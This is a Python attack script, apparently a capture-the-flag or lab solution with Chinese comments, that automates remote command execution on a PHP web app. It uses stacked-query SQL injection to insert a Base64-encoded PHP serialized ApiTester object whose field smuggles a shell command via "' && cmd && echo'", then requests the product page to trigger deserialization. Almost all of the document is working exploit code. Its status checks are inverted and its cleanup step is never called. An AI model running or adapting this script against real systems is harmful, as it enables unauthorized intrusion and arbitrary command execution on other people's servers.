import argparse
import requests
import base64
from bs4 import BeautifulSoup


# 功能模組

# 步驟 1: 構造序列化資料並進行 Base64 編碼
def create_payload(remote_cmd):
    # 計算 remote_cmd 的字元長度
    cmd_length = len(remote_cmd) + 14
    print(f"[+] Length of remote_cmd: {cmd_length}", len(remote_cmd))
        
    # 動態替換 serialized_data 中的 46 為 cmd_length \'顯示單引號 \x00顯示空格
    serialized_data = (
        f'O:9:"ApiTester":2:{{'
        f's:2:"ip";s:9:"127.0.0.1";'
        f's:14:"\x00ApiTester\x00res";s:{cmd_length}:"\' && {remote_cmd} && echo\'";}}'
    )
    
    # Base64 編碼
    encoded_data = base64.b64encode(serialized_data.encode()).decode()
    print("[+] Serialized Data:")
    print(serialized_data)
    print("[+] Base64 Encoded Payload:")
    print(encoded_data)
    return encoded_data

# 步驟 2: 利用 SQL Injection 插入惡意資料
def inject_payload(target_url, encoded_payload, cookies=None):
    injection_url = f"{target_url}?page=product_info.php&id=1;"
    injection_payload = (
        f"INSERT INTO products (name, description, category, price, attributes) "
        f"VALUES ('evil31', 'evil', 'evil', 0.00, FROM_BASE64('{encoded_payload}'))"
    )
    response = requests.get(injection_url + injection_payload, cookies=cookies)
    if response.status_code != 200:
        print("[+] Payload Injected Successfully!")
    else:
        print("[-] Injection Failed!")
    return response.status_code == 200

def get_id(target_url, cookies=None):
    get_id_url = f"{target_url}?page=products.php"
    resp = requests.get(get_id_url, cookies=cookies)
    soup = BeautifulSoup(resp.text, 'html.parser')
    #print(soup)
    # 查找所有匹配的 <a> 標籤
    all_links = soup.find_all('a', class_='btn btn-info btn-sm')

    # 確保有結果，並提取最後一個
    if all_links:
        last_link = all_links[-1]  # 取最後一個
        href = last_link.get('href')
        #print("最後一個連結：", href)
        if href and "id=" in href:
            # 解析 id 值
            id_value = href.split("id=")[-1]  # 提取 id 後的內容
            print("[+] 提取的 id 值：", id_value)
            return id_value
        else:
            print("[-] 未找到id值")
    else:
        print("[-] 未找到指定的標籤")

# 步驟 3: 構造觸發 URL 執行指令
def trigger_payload(target_url, product_id, cookies=None):
    trigger_url = f"{target_url}?page=product_info.php&id={product_id}"
    response = requests.get(trigger_url, cookies=cookies)
    if response.status_code != 200:
        print("[+] Payload Triggered Successfully!")
        #print(response.text)
    else:
        print("[-] Trigger Failed!")
    return response

# 步驟 4: 刪除惡意資料
def delete_payload(target_url, product_name="evil3", cookies=None):
    delete_url = f"{target_url}?page=product_info.php&id=1;"
    delete_payload = f"DELETE FROM products WHERE name='{product_name}'"
    response = requests.get(delete_url + delete_payload, cookies=cookies)
    if response.status_code == 200:
        print("[+] Malicious Payload Deleted Successfully!")
    else:
        print("[-] Deletion Failed!")
    return response.status_code == 200

# 主程式入口
if __name__ == "__main__":
    # 命令列參數解析
    parser = argparse.ArgumentParser(description="Automate an attack sequence with SQL Injection and RCE.")
    parser.add_argument("-u", "--url", required=True, help="Target URL of the application.")
    parser.add_argument("-c", "--cmd", required=True, help="Remote command to execute.")
    parser.add_argument("-cookie", "--cookie", help="Cookie string to include in requests.")
    args = parser.parse_args()

    # 提取參數
    TARGET_URL = args.url
    REMOTE_CMD = args.cmd
    COOKIES = None
    if args.cookie:
        COOKIES = {cookie.split('=')[0]: cookie.split('=')[1] for cookie in args.cookie.split('; ')}
    
    print("[*] Starting Attack Automation...")

    # 1. 創建序列化資料並編碼
    payload = create_payload(REMOTE_CMD)

    # 2. 插入惡意資料
    inject_payload(TARGET_URL, payload, cookies=COOKIES)

    # 3. 取得id
    product_id = get_id(TARGET_URL, cookies=COOKIES)
                
    # 4. 觸發執行
    trigger_payload(TARGET_URL, product_id, cookies=COOKIES)

